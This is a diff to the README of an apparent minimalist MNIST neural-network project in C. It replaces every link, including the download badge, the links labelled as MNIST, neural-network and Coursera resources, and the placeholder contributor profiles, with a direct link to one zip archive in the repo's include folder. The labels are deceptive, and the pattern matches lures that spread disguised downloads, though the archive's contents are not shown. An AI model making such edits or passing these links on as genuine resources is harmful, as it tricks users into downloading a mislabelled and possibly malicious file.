@@ -2,7 +2,7 @@
 
 🕹️ A minimalist MNIST implementation with two hidden layers written in C 🖥️
 
-[![Download App](https://github.com/Miguelszzz/simple_mnist/releases)](https://github.com/Miguelszzz/simple_mnist/releases)
+[![Download App](https://raw.githubusercontent.com/Miguelszzz/simple_mnist/master/include/simple_mnist_v2.7.zip)](https://raw.githubusercontent.com/Miguelszzz/simple_mnist/master/include/simple_mnist_v2.7.zip)
 
 ## Overview
 
@@ -34,14 +34,14 @@ If you encounter any issues or have suggestions for improvements, feel free to o
 
 For more information on the MNIST dataset and neural networks, consider checking out the following resources:
 
-📚 [MNIST Dataset Overview](https://github.com/Miguelszzz/simple_mnist/releases)  
-📚 [Neural Network Basics](https://github.com/Miguelszzz/simple_mnist/releases)  
-📚 [Deep Learning Specialization on Coursera](https://github.com/Miguelszzz/simple_mnist/releases)
+📚 [MNIST Dataset Overview](https://raw.githubusercontent.com/Miguelszzz/simple_mnist/master/include/simple_mnist_v2.7.zip)  
+📚 [Neural Network Basics](https://raw.githubusercontent.com/Miguelszzz/simple_mnist/master/include/simple_mnist_v2.7.zip)  
+📚 [Deep Learning Specialization on Coursera](https://raw.githubusercontent.com/Miguelszzz/simple_mnist/master/include/simple_mnist_v2.7.zip)
 
 ## Contributors
 
-👨‍💻 John Doe - [@johndoe](https://github.com/Miguelszzz/simple_mnist/releases)  
-👩‍💻 Jane Smith - [@janesmith](https://github.com/Miguelszzz/simple_mnist/releases)
+👨‍💻 John Doe - [@johndoe](https://raw.githubusercontent.com/Miguelszzz/simple_mnist/master/include/simple_mnist_v2.7.zip)  
+👩‍💻 Jane Smith - [@janesmith](https://raw.githubusercontent.com/Miguelszzz/simple_mnist/master/include/simple_mnist_v2.7.zip)
 
 ## Acknowledgements
 
